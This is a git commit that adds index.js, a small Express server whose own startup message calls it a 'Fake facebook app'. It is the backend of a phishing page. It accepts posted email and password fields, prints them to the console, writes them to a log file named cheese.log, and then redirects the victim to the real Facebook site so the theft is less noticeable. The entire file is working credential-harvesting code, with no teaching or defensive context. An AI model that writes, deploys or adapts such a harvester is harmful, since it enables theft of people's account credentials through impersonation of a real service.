7bb169dde9f5ebf664a66c0ff28597b808a19c87
ineeve <renatoineeve@gmail.com>
2020-06-27 03:43:22 +0100

    Adds code

---
+++ index.js
@@ -0,0 +1,29 @@
+const express = require('express')
+const app = express()
+const port = 8080
+const bodyParser = require('body-parser')
+const log4js = require("log4js");
+log4js.configure({
+  appenders: { cheese: { type: "file", filename: "cheese.log" } },
+  categories: { default: { appenders: ["cheese"], level: "info" } }
+});
+ 
+const logger = log4js.getLogger("cheese");
+
+app.use( bodyParser.json() );       // to support JSON-encoded bodies
+app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
+  extended: true
+})); 
+app.use(express.static('public'))
+app.post('/', function (req, res) {
+    let body = req.body;
+    let email = body.email;
+    let password = body.password;
+    console.log("email:",  email);
+    console.log("password:",  password);
+    logger.info("email:",  email);
+    logger.info("password:",  password);
+    res.redirect("https://www.facebook.com/")
+  })
+
+app.listen(port, () => console.log(`Fake facebook app listening at http://localhost:${port}`))
